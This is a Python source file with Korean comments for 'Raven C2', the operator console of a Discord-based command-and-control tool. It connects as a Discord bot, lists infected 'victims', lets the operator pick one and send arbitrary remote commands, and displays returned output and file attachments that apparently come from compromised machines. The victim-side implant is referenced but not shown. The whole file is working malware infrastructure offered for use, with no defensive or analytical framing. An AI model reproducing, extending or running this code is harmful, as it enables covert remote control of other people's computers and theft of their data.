# -*- coding: utf-8 -*-

import discord
import asyncio
import sys

# --- 설정 ---
BOT_TOKEN = "attacker_discord_bot_token_here"
C2_CHANNEL_ID = 1234567890# C2 채널 ID (피해자 코드와 동일하게)

# --- 전역 변수 ---
online_victims = {}  # 온라인 피해자 목록
selected_victim_id = None # 현재 선택된 피해자 ID
input_active = False # 현재 사용자가 입력을 받고 있는지 여부

def print_crow():
    """C2 콘솔 시작 시 환영 메시지와 아스키 아트를 출력하는 함수."""
    print(r"""
 _______________________
| |        |            |
| |        |            |
| |        |            |
| |        |            |
| |        |            |
| |      O |            |
| |        |            |
| |        |            |
| |        |            |
| |        |            |
| |       /             |
| |      /              |
| |     /               |
| |    .---.        .---.
| |   /     \  __  /     \    
| |  / /     \(  )/     \ \
| | //////   ' \/ '   \\\\\\
| |//// / // :    : \\ \ \\\\
|_// /   /  /'    '\  \   \ \\
 //          //..\\          \\
        ====UU====UU====
        |   '//||\\'   |
        |     ''''     |

      Welcome to the Raven C2
         Step inside and enjoy.
""")

def display_victims():
    """피해자 목록을 보기 좋게 출력하는 함수."""
    print("\n==== 피해자 목록 ====")
    if not online_victims:
        print("[!] 연결된 피해자 없음.")
    else:
        # 피해자 목록에 번호를 매겨서 출력
        for i, victim in enumerate(online_victims.keys(), 1):
            print(f"[{i}] {victim}")
    print("") # 목록 출력 후 한 줄 띄기

async def display_message(message_content, attachments=None):
    """결과 메시지를 깔끔하게 출력하는 함수. 사용자 입력을 방해하지 않습니다."""
    global input_active
    # 현재 사용자가 프롬프트에서 입력을 받고 있다면
    if input_active:
        # 현재 줄을 지우고, 메시지를 출력한 뒤, 다시 프롬프트를 그려줍니다.
        # \r: 커서를 줄의 시작으로 이동
        # \033[K: 커서 위치부터 줄 끝까지 지우기
        sys.stdout.write('\r\033[K')
        print(message_content)
        if attachments:
            for attachment in attachments:
                print(f"  [File]: {attachment.filename} | URL: {attachment.url}")
        
        # 현재 상태에 맞는 프롬프트를 다시 그려줍니다.
        prompt = "raven-c2>> " if selected_victim_id else ">> "
        sys.stdout.write(prompt)
        sys.stdout.flush()
    else:
        # 사용자가 입력을 받고 있지 않을 때는 그냥 출력합니다.
        print(message_content)
        if attachments:
            for attachment in attachments:
                print(f"  [File]: {attachment.filename} | URL: {attachment.url}")


# --- Discord 클라이언트 설정 ---
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

async def handle_user_input(channel):
    """사용자의 터미널 입력을 처리하는 메인 루프."""
    global selected_victim_id, input_active

    while True:
        # 현재 상태에 맞는 프롬프트를 설정합니다.
        prompt = "raven-c2>> " if selected_victim_id else ">> "
        
        input_active = True
        command = await asyncio.to_thread(input, prompt)
        input_active = False

        if not command:
            continue

        cmd_lower = command.lower()

        # --- 로컬 제어 명령어 처리 ---
        if cmd_lower in ['list', 'ls', 'l']:
            display_victims()
            continue
        
        if cmd_lower == 'refresh':
            online_victims.clear()
            print("[+] 피해자 목록을 초기화하고, 다시 동기화를 요청합니다...")
            await channel.send("refresh")
            await asyncio.sleep(1) # 피해자들이 응답할 시간을 줌
            display_victims()
            continue

        if cmd_lower == 'back':
            if selected_victim_id:
                print(f"[+] 피해자 선택 해제: {selected_victim_id}")
                selected_victim_id = None
            else:
                print("[!] 선택된 피해자가 없습니다.")
            continue

        # --- 피해자 선택 로직 ---
        # 입력된 명령어가 온라인 피해자 목록에 있는 ID와 일치하는 경우
        if command in online_victims:
            selected_victim_id = command
            print(f"[+] 피해자 선택됨: {selected_victim_id}")
            continue

        # --- 원격 명령어 전송 ---
        if selected_victim_id:
            full_command = f"{selected_victim_id} {command}"
            await channel.send(full_command)
        else:
            print("[!] 먼저 'list'로 목록을 확인 후, 피해자 ID를 입력하여 선택하세요.")


@client.event
async def on_ready():
    """봇이 준비되었을 때 호출되는 이벤트 핸들러."""
    print_crow()
    c2_channel = client.get_channel(C2_CHANNEL_ID)
    if not c2_channel:
        print(f"\n[!] CRITICAL: C2 채널({C2_CHANNEL_ID})을 찾을 수 없습니다.")
        await client.close()
        return
        
    print(f"[+] C2 서버 실행중: 채널 #{c2_channel.name}\n")
    
    await c2_channel.send("refresh")
    await asyncio.sleep(1)
    display_victims()

    client.loop.create_task(handle_user_input(c2_channel))

@client.event
async def on_message(message):
    """C2 채널에 새로운 메시지가 올라올 때마다 호출되는 이벤트 핸들러."""
    if message.channel.id != C2_CHANNEL_ID or message.author == client.user:
        return

    content = message.content.strip()

    # --- 피해자 등록 메시지 처리 ---
    if content.startswith('`') and content.endswith('`'):
        victim_id_str = content.strip('`')
        if victim_id_str not in online_victims:
            await display_message(f"\n[+] 새로운 피해자 연결: {victim_id_str}")
        online_victims[victim_id_str] = 'online'
    
    # --- 피해자의 결과 메시지 처리 ---
    # `Response from`으로 시작하는 메시지는 결과로 간주
    elif content.startswith("```Response from"):
        # =================================================================
        # 여기가 수정된 부분입니다!
        # 불필요한 접두어 없이, 순수한 결과만 display_message 함수로 넘깁니다.
        # =================================================================
        clean_content = content.split('\n', 1)[1][:-3]
        await display_message(clean_content, message.attachments)
    
    # 그 외의 메시지 (예: 파일만 단독으로 올 때)
    elif message.attachments and not content:
         await display_message("", message.attachments)


if __name__ == "__main__":
    try:
        client.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("[!] CRITICAL: 로그인 실패. 봇 토큰이 올바르지 않습니다.")
    except Exception as e:
        print(f"[!] 예기치 않은 오류 발생: {e}")